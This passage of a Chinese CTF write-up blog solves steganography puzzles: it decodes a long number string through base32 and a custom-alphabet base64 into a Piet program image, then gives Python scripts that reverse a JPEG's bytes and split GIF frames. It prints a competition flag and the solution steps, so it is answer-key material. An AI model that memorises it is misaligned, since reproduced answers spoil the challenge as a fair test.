class="number">82</span> <span class="number">74</span> <span class="number">87</span> <span class="number">75</span> <span class="number">74</span> <span class="number">75</span> <span class="number">71</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">75</span> <span class="number">86</span> <span class="number">83</span> <span class="number">71</span> <span class="number">69</span> <span class="number">79</span> <span class="number">68</span> <span class="number">81</span> <span class="number">78</span> <span class="number">74</span> <span class="number">50</span> <span class="number">85</span> <span class="number">87</span> <span class="number">87</span> <span class="number">67</span> <span class="number">76</span> <span class="number">71</span> <span class="number">66</span> <span class="number">50</span> <span class="number">87</span> <span class="number">87</span> <span class="number">84</span> <span class="number">68</span> <span class="number">67</span> <span class="number">79</span> <span class="number">85</span> <span class="number">51</span> <span class="number">69</span> <span class="number">87</span> <span class="number">81</span> <span class="number">82</span> <span class="number">81</span> <span class="number">74</span> <span class="number">82</span> <span class="number">67</span> <span class="number">88</span> <span class="number">75</span> <span class="number">87</span> <span class="number">68</span> <span class="number">70</span> <span class="number">77</span> <span class="number">82</span> <span class="number">66</span> <span class="number">68</span> <span class="number">73</span> <span class="number">78</span> <span class="number">76</span> <span class="number">74</span> <span class="number">71</span> <span class="number">86</span> <span class="number">88</span> <span class="number">69</span> <span class="number">85</span> <span class="number">83</span> <span class="number">82</span> <span class="number">80</span> <span class="number">77</span> <span class="number">70</span> <span class="number">69</span> <span class="number">85</span> <span class="number">87</span> <span class="number">53</span> <span class="number">84</span> <span class="number">89</span> <span class="number">79</span> <span class="number">70</span> <span class="number">70</span> <span class="number">69</span> <span class="number">69</span> <span class="number">87</span> <span class="number">67</span> <span class="number">84</span> <span class="number">79</span> <span class="number">82</span> <span class="number">71</span> <span class="number">86</span> <span class="number">81</span> <span class="number">83</span> <span class="number">66</span> <span class="number">82</span> <span class="number">78</span> <span class="number">78</span> <span class="number">74</span> <span class="number">72</span> <span class="number">75</span> <span class="number">83</span> <span class="number">50</span> <span class="number">72</span> <span class="number">75</span> <span class="number">82</span> <span class="number">68</span> <span class="number">88</span> <span class="number">73</span> <span class="number">86</span> <span class="number">83</span> <span class="number">83</span> <span class="number">79</span> <span class="number">86</span> <span class="number">69</span> <span class="number">88</span> <span class="number">69</span> <span class="number">53</span> <span class="number">74</span> <span class="number">87</span> <span class="number">78</span> <span class="number">74</span> <span class="number">71</span> <span class="number">87</span> <span class="number">67</span> <span class="number">87</span> <span class="number">67</span> <span class="number">76</span> <span class="number">73</span> <span class="number">74</span> <span class="number">73</span> <span class="number">88</span> <span class="number">65</span> <span class="number">84</span> <span class="number">66</span> <span class="number">88</span> <span class="number">78</span> <span class="number">90</span> <span class="number">86</span> <span class="number">85</span> <span class="number">89</span> <span class="number">81</span> <span class="number">82</span> <span class="number">82</span> <span class="number">79</span> <span class="number">86</span> <span class="number">73</span> <span class="number">86</span> <span class="number">77</span> <span class="number">77</span> <span class="number">68</span> <span class="number">78</span> <span class="number">79</span> <span class="number">82</span> <span class="number">70</span> <span class="number">87</span> <span class="number">75</span> <span class="number">82</span> <span class="number">50</span> <span class="number">74</span> <span class="number">79</span> <span class="number">74</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">50</span> <span class="number">74</span> <span class="number">71</span> <span class="number">66</span> <span class="number">76</span> <span class="number">69</span> <span class="number">75</span> <span class="number">84</span> <span class="number">75</span> <span class="number">81</span> <span class="number">79</span> <span class="number">70</span> <span class="number">71</span> <span class="number">85</span> <span class="number">52</span> <span class="number">85</span> <span class="number">75</span> <span class="number">71</span> <span class="number">74</span> <span class="number">78</span> <span class="number">50</span> <span class="number">70</span> <span class="number">69</span> <span class="number">85</span> <span class="number">67</span> <span class="number">78</span> <span class="number">75</span> <span class="number">89</span> <span class="number">50</span> <span class="number">69</span> <span class="number">81</span> <span class="number">81</span> <span class="number">75</span> <span class="number">79</span> <span class="number">75</span> <span class="number">86</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">76</span> <span class="number">66</span> <span class="number">88</span> <span class="number">69</span> <span class="number">83</span> <span class="number">83</span> <span class="number">51</span> <span class="number">78</span> <span class="number">77</span> <span class="number">81</span> <span class="number">88</span> <span class="number">86</span> <span class="number">77</span> <span class="number">78</span> <span class="number">90</span> <span class="number">90</span> <span class="number">75</span> <span class="number">89</span> <span class="number">50</span> <span class="number">85</span> <span class="number">81</span> <span class="number">84</span> <span class="number">74</span> <span class="number">80</span> <span class="number">77</span> <span class="number">86</span> <span class="number">83</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">50</span> <span class="number">82</span> <span class="number">73</span> <span class="number">78</span> <span class="number">85</span> <span class="number">88</span> <span class="number">75</span> <span class="number">77</span> <span class="number">76</span> <span class="number">86</span> <span class="number">75</span> <span class="number">70</span> <span class="number">67</span> <span class="number">87</span> <span class="number">54</span> <span class="number">52</span> <span class="number">75</span> <span class="number">76</span> <span class="number">74</span> <span class="number">77</span> <span class="number">90</span> <span class="number">88</span> <span class="number">79</span> <span class="number">50</span> <span class="number">74</span> <span class="number">86</span> <span class="number">74</span> <span class="number">78</span> <span class="number">69</span> <span class="number">71</span> <span class="number">73</span> <span class="number">54</span> <span class="number">74</span> <span class="number">81</span> <span class="number">79</span> <span class="number">53</span> <span class="number">71</span> <span class="number">68</span> <span class="number">75</span> <span class="number">86</span> <span class="number">74</span> <span class="number">87</span> <span class="number">79</span> <span class="number">81</span> <span class="number">51</span> <span class="number">84</span> <span class="number">65</span> <span class="number">77</span> <span class="number">83</span> <span class="number">76</span> <span class="number">74</span> <span class="number">86</span> <span class="number">70</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">78</span> <span class="number">71</span> <span class="number">65</span> <span class="number">89</span> <span class="number">87</span> <span class="number">52</span> <span class="number">89</span> <span class="number">50</span> <span class="number">89</span> <span class="number">77</span> <span class="number">70</span> <span class="number">71</span> <span class="number">87</span> <span class="number">87</span> <span class="number">85</span> <span class="number">83</span> <span class="number">73</span> <span class="number">78</span> <span class="number">74</span> <span class="number">50</span> <span class="number">87</span> <span class="number">89</span> <span class="number">53</span> <span class="number">51</span> <span class="number">69</span> <span class="number">71</span> <span class="number">65</span> <span class="number">52</span> <span class="number">87</span> <span class="number">89</span> <span class="number">84</span> <span class="number">74</span> <span class="number">87</span> <span class="number">72</span> <span class="number">66</span> <span class="number">52</span> <span class="number">71</span> <span class="number">83</span> <span class="number">90</span> <span class="number">50</span> <span class="number">76</span> <span class="number">74</span> <span class="number">73</span> <span class="number">52</span> <span class="number">87</span> <span class="number">69</span> <span class="number">78</span> <span class="number">68</span> <span class="number">87</span> <span class="number">74</span> <span class="number">81</span> <span class="number">51</span> <span class="number">84</span> <span class="number">75</span> <span class="number">84</span> <span class="number">66</span> <span class="number">84</span> <span class="number">71</span> <span class="number">53</span> <span class="number">76</span> <span class="number">69</span> <span class="number">52</span> <span class="number">53</span> <span class="number">68</span> <span class="number">72</span> <span class="number">74</span> <span class="number">78</span> <span class="number">83</span> <span class="number">85</span> <span class="number">85</span> <span class="number">76</span> <span class="number">90</span> <span class="number">86</span> <span class="number">79</span> <span class="number">66</span> <span class="number">70</span> <span class="number">70</span> <span class="number">77</span> <span class="number">77</span> <span class="number">74</span> <span class="number">83</span> <span class="number">74</span> <span class="number">78</span> <span class="number">50</span> <span class="number">85</span> <span class="number">50</span> <span class="number">78</span> <span class="number">83</span> <span class="number">82</span> <span class="number">77</span> <span class="number">52</span> <span class="number">89</span> <span class="number">84</span> <span class="number">83</span> <span class="number">79</span> <span class="number">75</span> <span class="number">87</span> <span class="number">77</span> <span class="number">69</span> <span class="number">90</span> <span class="number">69</span> <span class="number">89</span> <span class="number">78</span> <span class="number">51</span> <span class="number">66</span> <span class="number">79</span> <span class="number">81</span> <span class="number">52</span> <span class="number">85</span> <span class="number">75</span> <span class="number">90</span> <span class="number">76</span> <span class="number">68</span> <span class="number">78</span> <span class="number">70</span> <span class="number">71</span> <span class="number">86</span> <span class="number">81</span> <span class="number">52</span> <span class="number">83</span> <span class="number">78</span> <span class="number">74</span> <span class="number">78</span> <span class="number">73</span> <span class="number">85</span> <span class="number">85</span> <span class="number">79</span> <span class="number">74</span> <span class="number">88</span> <span class="number">78</span> <span class="number">90</span> <span class="number">51</span> <span class="number">70</span> <span class="number">67</span> <span class="number">50</span> <span class="number">51</span> <span class="number">79</span> <span class="number">79</span> <span class="number">74</span> <span class="number">70</span> <span class="number">88</span> <span class="number">79</span> <span class="number">78</span> <span class="number">76</span> <span class="number">90</span> <span class="number">75</span> <span class="number">70</span> <span class="number">69</span> <span class="number">84</span> <span class="number">81</span> <span class="number">77</span> <span class="number">84</span> <span class="number">79</span> <span class="number">73</span> <span class="number">52</span> <span class="number">51</span> <span class="number">86</span> <span class="number">71</span> <span class="number">83</span> <span class="number">75</span> <span class="number">78</span> <span class="number">75</span> <span class="number">66</span> <span class="number">75</span> <span class="number">84</span> <span class="number">67</span> <span class="number">86</span> <span class="number">83</span> <span class="number">81</span> <span class="number">73</span> <span class="number">78</span> <span class="number">85</span> <span class="number">87</span> <span class="number">69</span> <span class="number">78</span> <span class="number">67</span> <span class="number">76</span> <span class="number">71</span> <span class="number">70</span> <span class="number">68</span> <span class="number">87</span> <span class="number">67</span> <span class="number">89</span> <span class="number">84</span> <span class="number">74</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">71</span> <span class="number">73</span> <span class="number">83</span> <span class="number">76</span> <span class="number">72</span> <span class="number">71</span> <span class="number">82</span> <span class="number">51</span> <span class="number">84</span> <span class="number">71</span> <span class="number">52</span> <span class="number">83</span> <span class="number">82</span> <span class="number">73</span> <span class="number">77</span> <span class="number">90</span> <span class="number">85</span> <span class="number">69</span> <span class="number">83</span> <span class="number">50</span> <span class="number">89</span> <span class="number">78</span> <span class="number">90</span> <span class="number">68</span> <span class="number">84</span> <span class="number">65</span> <span class="number">77</span> <span class="number">68</span> <span class="number">85</span> <span class="number">74</span> <span class="number">85</span> <span class="number">89</span> <span class="number">69</span> <span class="number">75</span> <span class="number">84</span> <span class="number">74</span> <span class="number">81</span> <span class="number">71</span> <span class="number">86</span> <span class="number">52</span> <span class="number">69</span> <span class="number">83</span> <span class="number">54</span> <span class="number">74</span> <span class="number">82</span> <span class="number">78</span> <span class="number">86</span> <span class="number">70</span> <span class="number">87</span> <span class="number">71</span> <span class="number">77</span> <span class="number">67</span> <span class="number">85</span> <span class="number">74</span> <span class="number">73</span> <span class="number">51</span> <span class="number">88</span> <span class="number">75</span> <span class="number">78</span> <span class="number">50</span> <span class="number">78</span> <span class="number">75</span> <span class="number">90</span> <span class="number">52</span> <span class="number">69</span> <span class="number">52</span> <span class="number">53</span> <span class="number">67</span> <span class="number">72</span> <span class="number">71</span> <span class="number">66</span> <span class="number">50</span> <span class="number">68</span> <span class="number">71</span> <span class="number">89</span> <span class="number">84</span> <span class="number">66</span> <span class="number">75</span> <span class="number">70</span> <span class="number">77</span> <span class="number">72</span> <span class="number">83</span> <span class="number">51</span> <span class="number">51</span> <span class="number">88</span> <span class="number">73</span> <span class="number">86</span> <span class="number">72</span> <span class="number">71</span> <span class="number">75</span> <span class="number">54</span> <span class="number">75</span> <span class="number">70</span> <span class="number">79</span> <span class="number">52</span> <span class="number">89</span> <span class="number">84</span> <span class="number">67</span> <span class="number">81</span> <span class="number">50</span> <span class="number">67</span> <span class="number">71</span> <span class="number">82</span> <span class="number">90</span> <span class="number">71</span> <span class="number">52</span> <span class="number">86</span> <span class="number">83</span> <span class="number">89</span> <span class="number">73</span> <span class="number">70</span> <span class="number">73</span> <span class="number">87</span> <span class="number">69</span> <span class="number">54</span> <span class="number">68</span> <span class="number">88</span> <span class="number">73</span> <span class="number">78</span> <span class="number">90</span> <span class="number">69</span> <span class="number">87</span> <span class="number">52</span> <span class="number">66</span> <span class="number">84</span> <span class="number">73</span> <span class="number">53</span> <span class="number">81</span> <span class="number">85</span> <span class="number">67</span> <span class="number">50</span> <span class="number">76</span> <span class="number">83</span> <span class="number">71</span> <span class="number">53</span> <span class="number">76</span> <span class="number">69</span> <span class="number">83</span> <span class="number">86</span> <span class="number">84</span> <span class="number">79</span> <span class="number">73</span> <span class="number">70</span> <span class="number">50</span> <span class="number">69</span> <span class="number">52</span> <span class="number">89</span> <span class="number">75</span> <span class="number">84</span> <span class="number">71</span> <span class="number">77</span> <span class="number">51</span> <span class="number">84</span> <span class="number">73</span> <span class="number">86</span> <span class="number">67</span> <span class="number">75</span> <span class="number">77</span> <span class="number">73</span> <span class="number">89</span> <span class="number">84</span> <span class="number">69</span> <span class="number">51</span> <span class="number">75</span> <span class="number">72</span> <span class="number">74</span> <span class="number">77</span> <span class="number">88</span> <span class="number">88</span> <span class="number">73</span> <span class="number">89</span> <span class="number">51</span> <span class="number">80</span> <span class="number">73</span> <span class="number">53</span> <span class="number">50</span> <span class="number">69</span> <span class="number">75</span> <span class="number">51</span> <span class="number">84</span> <span class="number">86</span> <span class="number">78</span> <span class="number">70</span> <span class="number">90</span> <span class="number">69</span> <span class="number">87</span> <span class="number">89</span> <span class="number">75</span> <span class="number">78</span> <span class="number">79</span> <span class="number">53</span> <span class="number">76</span> <span class="number">71</span> <span class="number">87</span> <span class="number">50</span> <span class="number">83</span> <span class="number">67</span> <span class="number">75</span> <span class="number">90</span> <span class="number">89</span> <span class="number">69</span> <span class="number">75</span> <span class="number">53</span> <span class="number">90</span> <span class="number">85</span> <span class="number">78</span> <span class="number">81</span> <span class="number">90</span> <span class="number">88</span> <span class="number">75</span> <span class="number">79</span> <span class="number">68</span> <span class="number">88</span> <span class="number">76</span> <span class="number">66</span> <span class="number">67</span> <span class="number">87</span> <span class="number">52</span> <span class="number">77</span> <span class="number">74</span> <span class="number">82</span> <span class="number">75</span> <span class="number">90</span> <span class="number">70</span> <span class="number">86</span> <span class="number">65</span> <span class="number">90</span> <span class="number">67</span> <span class="number">76</span> <span class="number">75</span> <span class="number">77</span> <span class="number">51</span> <span class="number">68</span> <span class="number">83</span> <span class="number">89</span> <span class="number">82</span> <span class="number">89</span> <span class="number">75</span> <span class="number">66</span> <span class="number">88</span> <span class="number">69</span> <span class="number">52</span> <span class="number">78</span> <span class="number">67</span> <span class="number">73</span> <span class="number">74</span> <span class="number">74</span> <span class="number">86</span> <span class="number">84</span> <span class="number">69</span> <span class="number">52</span> <span class="number">75</span> <span class="number">70</span> <span class="number">75</span> <span class="number">90</span> <span class="number">73</span> <span class="number">84</span> <span class="number">65</span> <span class="number">50</span> <span class="number">75</span> <span class="number">74</span> <span class="number">77</span> <span class="number">82</span> <span class="number">51</span> <span class="number">85</span> <span class="number">87</span> <span class="number">81</span> <span class="number">82</span> <span class="number">85</span> <span class="number">77</span> <span class="number">70</span> <span class="number">85</span> <span class="number">87</span> <span class="number">69</span> <span class="number">78</span> <span class="number">68</span> <span class="number">87</span> <span class="number">74</span> <span class="number">74</span> <span class="number">72</span> <span class="number">70</span> <span class="number">67</span> <span class="number">78</span> <span class="number">68</span> <span class="number">78</span> <span class="number">78</span> <span class="number">78</span> <span class="number">74</span> <span class="number">70</span> <span class="number">71</span> <span class="number">77</span> <span class="number">90</span> <span class="number">88</span> <span class="number">77</span> <span class="number">69</span> <span class="number">88</span> <span class="number">88</span> <span class="number">73</span> <span class="number">89</span> <span class="number">84</span> <span class="number">66</span> <span class="number">75</span> <span class="number">66</span> <span class="number">73</span> <span class="number">85</span> <span class="number">50</span> <span class="number">90</span> <span class="number">74</span> <span class="number">80</span> <span class="number">74</span> <span class="number">73</span> <span class="number">88</span> <span class="number">86</span> <span class="number">67</span> <span class="number">83</span> <span class="number">75</span> <span class="number">89</span> <span class="number">79</span> <span class="number">73</span> <span class="number">50</span> <span class="number">72</span> <span class="number">85</span> <span class="number">53</span> <span class="number">68</span> <span class="number">72</span> <span class="number">75</span> <span class="number">77</span> <span class="number">51</span> <span class="number">85</span> <span class="number">83</span> <span class="number">82</span> <span class="number">74</span> <span class="number">90</span> <span class="number">79</span> <span class="number">70</span> <span class="number">71</span> <span class="number">83</span> <span class="number">54</span> <span class="number">52</span> <span class="number">50</span> <span class="number">79</span> <span class="number">71</span> <span class="number">70</span> <span class="number">68</span> <span class="number">86</span> <span class="number">81</span> <span class="number">85</span> <span class="number">51</span> <span class="number">74</span> <span class="number">71</span> <span class="number">65</span> <span class="number">89</span> <span class="number">85</span> <span class="number">87</span> <span class="number">50</span> <span class="number">84</span> <span class="number">88</span> <span class="number">71</span> <span class="number">82</span> <span class="number">65</span> <span class="number">85</span> <span class="number">83</span> <span class="number">53</span> <span class="number">75</span> <span class="number">69</span> <span class="number">75</span> <span class="number">66</span> <span class="number">88</span> <span class="number">69</span> <span class="number">50</span> <span class="number">50</span> <span class="number">50</span> <span class="number">50</span> <span class="number">74</span> <span class="number">82</span> <span class="number">84</span> <span class="number">84</span> <span class="number">71</span> <span class="number">52</span> <span class="number">66</span> <span class="number">82</span> <span class="number">73</span> <span class="number">85</span> <span class="number">50</span> <span class="number">84</span> <span class="number">77</span> <span class="number">79</span> <span class="number">75</span> <span class="number">78</span> <span class="number">71</span> <span class="number">74</span> <span class="number">51</span> <span class="number">85</span> <span class="number">67</span> <span class="number">84</span> <span class="number">82</span> <span class="number">86</span> <span class="number">73</span> <span class="number">90</span> <span class="number">86</span> <span class="number">69</span> <span class="number">83</span> <span class="number">87</span> <span class="number">67</span> <span class="number">78</span> <span class="number">78</span> <span class="number">90</span> <span class="number">82</span> <span class="number">85</span> <span class="number">87</span> <span class="number">86</span> <span class="number">83</span> <span class="number">76</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">69</span> <span class="number">77</span> <span class="number">53</span> <span class="number">67</span> <span class="number">79</span> <span class="number">74</span> <span class="number">77</span> <span class="number">51</span> <span class="number">86</span> <span class="number">67</span> <span class="number">53</span> <span class="number">90</span> <span class="number">82</span> <span class="number">77</span> <span class="number">82</span> <span class="number">88</span> <span class="number">68</span> <span class="number">65</span> <span class="number">51</span> <span class="number">90</span> <span class="number">88</span> <span class="number">78</span> <span class="number">70</span> <span class="number">67</span> <span class="number">84</span> <span class="number">75</span> <span class="number">87</span> <span class="number">67</span> <span class="number">75</span> <span class="number">74</span> <span class="number">90</span> <span class="number">73</span> <span class="number">87</span> <span class="number">77</span> <span class="number">77</span> <span class="number">76</span> <span class="number">68</span> <span class="number">71</span> <span class="number">82</span> <span class="number">69</span> <span class="number">87</span> <span class="number">85</span> <span class="number">81</span> <span class="number">84</span> <span class="number">80</span> <span class="number">74</span> <span class="number">90</span> <span class="number">85</span> <span class="number">88</span> <span class="number">83</span> <span class="number">77</span> <span class="number">66</span> <span class="number">88</span> <span class="number">78</span> <span class="number">70</span> <span class="number">84</span> <span class="number">86</span> <span class="number">81</span> <span class="number">83</span> <span class="number">67</span> <span class="number">76</span> <span class="number">73</span> <span class="number">73</span> <span class="number">90</span> <span class="number">86</span> <span class="number">73</span> <span class="number">50</span> <span class="number">84</span> <span class="number">67</span> <span class="number">78</span> <span class="number">82</span> <span class="number">73</span> <span class="number">69</span> <span class="number">75</span> <span class="number">50</span> <span class="number">50</span> <span class="number">76</span> <span class="number">71</span> <span class="number">90</span> <span class="number">69</span> <span class="number">87</span> <span class="number">69</span> <span class="number">85</span> <span class="number">84</span> <span class="number">77</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">87</span> <span class="number">67</span> <span class="number">90</span> <span class="number">74</span> <span class="number">90</span> <span class="number">74</span> <span class="number">86</span> <span class="number">52</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">74</span> <span class="number">77</span> <span class="number">86</span> <span class="number">68</span> <span class="number">70</span> <span class="number">81</span> <span class="number">86</span> <span class="number">82</span> <span class="number">88</span> <span class="number">71</span> <span class="number">70</span> <span class="number">70</span> <span class="number">71</span> <span class="number">87</span> <span class="number">85</span> <span class="number">66</span> <span class="number">89</span> <span class="number">74</span> <span class="number">74</span> <span class="number">90</span> <span class="number">71</span> <span class="number">52</span> <span class="number">54</span> <span class="number">67</span> <span class="number">89</span> <span class="number">71</span> <span class="number">85</span> <span class="number">89</span> <span class="number">72</span> <span class="number">83</span> <span class="number">87</span> <span class="number">66</span> <span class="number">80</span> <span class="number">71</span> <span class="number">85</span> <span class="number">52</span> <span class="number">69</span> <span class="number">87</span> <span class="number">89</span> <span class="number">82</span> <span class="number">81</span> <span class="number">74</span> <span class="number">70</span> <span class="number">86</span> <span class="number">71</span> <span class="number">69</span> <span class="number">77</span> <span class="number">76</span> <span class="number">76</span> <span class="number">78</span> <span class="number">86</span> <span class="number">86</span> <span class="number">84</span> <span class="number">83</span> <span class="number">52</span> <span class="number">75</span> <span class="number">78</span> <span class="number">79</span> <span class="number">81</span> <span class="number">52</span> <span class="number">68</span> <span class="number">75</span> <span class="number">83</span> <span class="number">83</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">89</span> <span class="number">68</span> <span class="number">71</span> <span class="number">82</span> <span class="number">74</span> <span class="number">86</span> <span class="number">78</span> <span class="number">66</span> <span class="number">70</span> <span class="number">85</span> <span class="number">83</span> <span class="number">78</span> <span class="number">75</span> <span class="number">70</span> <span class="number">78</span> <span class="number">90</span> <span class="number">72</span> <span class="number">68</span> <span class="number">73</span> <span class="number">50</span> <span class="number">67</span> <span class="number">70</span> <span class="number">79</span> <span class="number">85</span> <span class="number">51</span> <span class="number">85</span> <span class="number">50</span> <span class="number">77</span> <span class="number">50</span> <span class="number">78</span> <span class="number">77</span> <span class="number">70</span> <span class="number">87</span> <span class="number">85</span> <span class="number">71</span> <span class="number">83</span> <span class="number">75</span> <span class="number">83</span> <span class="number">77</span> <span class="number">70</span> <span class="number">77</span> <span class="number">71</span> <span class="number">87</span> <span class="number">78</span> <span class="number">50</span> <span class="number">87</span> <span class="number">71</span> <span class="number">77</span> <span class="number">51</span> <span class="number">84</span> <span class="number">65</span> <span class="number">79</span> <span class="number">66</span> <span class="number">84</span> <span class="number">70</span> <span class="number">52</span> <span class="number">50</span> <span class="number">69</span> <span class="number">69</span> <span class="number">90</span> <span class="number">68</span> <span class="number">67</span> <span class="number">72</span> <span class="number">70</span> <span class="number">87</span> <span class="number">70</span> <span class="number">81</span> <span class="number">84</span> <span class="number">76</span> <span class="number">77</span> <span class="number">79</span> <span class="number">65</span> <span class="number">90</span> <span class="number">85</span> <span class="number">87</span> <span class="number">86</span> <span class="number">74</span> <span class="number">85</span> <span class="number">78</span> <span class="number">70</span> <span class="number">66</span> <span class="number">68</span> <span class="number">83</span> <span class="number">84</span> <span class="number">83</span> <span class="number">76</span> <span class="number">77</span> <span class="number">78</span> <span class="number">74</span> <span class="number">88</span> <span class="number">65</span> <span class="number">84</span> <span class="number">66</span> <span class="number">87</span> <span class="number">75</span> <span class="number">73</span> <span class="number">51</span> <span class="number">70</span> <span class="number">81</span> <span class="number">89</span> <span class="number">90</span> <span class="number">82</span> <span class="number">71</span> <span class="number">90</span> <span class="number">88</span> <span class="number">71</span> <span class="number">87</span> <span class="number">79</span> <span class="number">68</span> <span class="number">67</span> <span class="number">71</span> <span class="number">78</span> <span class="number">68</span> <span class="number">84</span> <span class="number">83</span> <span class="number">78</span> <span class="number">90</span> <span class="number">82</span> <span class="number">75</span> <span class="number">90</span> <span class="number">74</span> <span class="number">68</span> <span class="number">81</span> <span class="number">90</span> <span class="number">67</span> <span class="number">78</span> <span class="number">71</span> <span class="number">86</span> <span class="number">75</span> <span class="number">87</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">71</span> <span class="number">86</span> <span class="number">86</span> <span class="number">72</span> <span class="number">75</span> <span class="number">77</span> <span class="number">75</span> <span class="number">78</span> <span class="number">74</span> <span class="number">81</span> <span class="number">51</span> <span class="number">86</span> <span class="number">67</span> <span class="number">78</span> <span class="number">50</span> <span class="number">78</span> <span class="number">74</span> <span class="number">69</span> <span class="number">51</span> <span class="number">87</span> <span class="number">71</span> <span class="number">90</span> <span class="number">66</span> <span class="number">87</span> <span class="number">79</span> <span class="number">78</span> <span class="number">88</span> <span class="number">84</span> <span class="number">67</span> <span class="number">52</span> <span class="number">82</span> <span class="number">86</span> <span class="number">78</span> <span class="number">77</span> <span class="number">52</span> <span class="number">85</span> <span class="number">75</span> <span class="number">89</span> <span class="number">76</span> <span class="number">66</span> <span class="number">78</span> <span class="number">74</span> <span class="number">69</span> <span class="number">84</span> <span class="number">75</span> <span class="number">76</span> <span class="number">90</span> <span class="number">82</span> <span class="number">79</span> <span class="number">82</span> <span class="number">74</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">84</span> <span class="number">67</span> <span class="number">71</span> <span class="number">78</span> <span class="number">77</span> <span class="number">84</span> <span class="number">83</span> <span class="number">89</span> <span class="number">82</span> <span class="number">86</span> <span class="number">79</span> <span class="number">52</span> <span class="number">89</span> <span class="number">85</span> <span class="number">75</span> <span class="number">79</span> <span class="number">76</span> <span class="number">76</span></span><br><span class="linespan><br><span class="line"><span class="comment">#解码顺序</span></span><br><span class="line"><span class="comment">#base32</span></span><br><span class="line"><span class="comment">#base64 码表：sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W</span></span><br><span class="line"><span class="comment">#base64</span></span><br></pre></td></tr></table></figure></div><p>得到一张png图片</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/2023XiangShan-Replay.assets/Untitled.png"                      alt="jiemi"                ></p><p>使用npiet工具来运行这个花不拉几的语言图片程序得到flag</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/2023XiangShan-Replay.assets/cmd.png"                      alt="flag"                ></p><p>flag{4b6c1737-27e5-41c4-95e3-f70ad196063e}</p><p>piet编程语言:面向堆栈的语言，颜色区域表示数字，</p><h3 id="EXP2：逆序图片"><a href="#EXP2：逆序图片" class="headerlink" title="EXP2：逆序图片"></a>EXP2：逆序图片</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="comment"># author:Reborn </span></span><br><span class="line"> </span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;rb+&#x27;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;fla.jpg&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f2.write(f1.read()[::-<span class="number">1</span>])</span><br><span class="line">f1.close()</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></div><h3 id="EXP3：GIF拆解拼接"><a href="#EXP3：GIF拆解拼接" class="headerlink" title="EXP3：GIF拆解拼接"></a>EXP3：GIF拆解拼接</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="comment"># author:Reborn </span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"> </span><br><span class="line">savepath = <span class="string">&quot;OmyGods\\&quot;</span></span><br><span class="line">path = <span class="string">&#x27;.\\&#x27;</span></span><br><span class="line"> </span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;glance.gif&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">im.save(savepath+<span class="string">&#x27;glance&#123;:d&#125;.png&#x27;</span>.<span class="built_in">format</span>(im.tell()))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:           <span class="comment">#while循环拆解</span></span><br><span class="line">im.seek(im.tell()+<span class="number">1</span>)  <span class="comment">#提取帧数</span></span><br><span class="line">im.save(savepath+<span class="string">&#x27;glance&#123;:d&#125;.png&#x27;</span>.<span class="built_in">format</span>(im.tell()))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="comment">#得到帧数</span></span><br></pre></td></tr></table></figure></div><p>创建大图，将每一帧图片贴上去，im是创建好的大图，然后使用<code>im.paste(image,(width,0,2+width,600))</code>方法，4元坐标，高度不变，宽度每次加2（每一帧的宽度）</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="comment"># author:Reborn </span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span 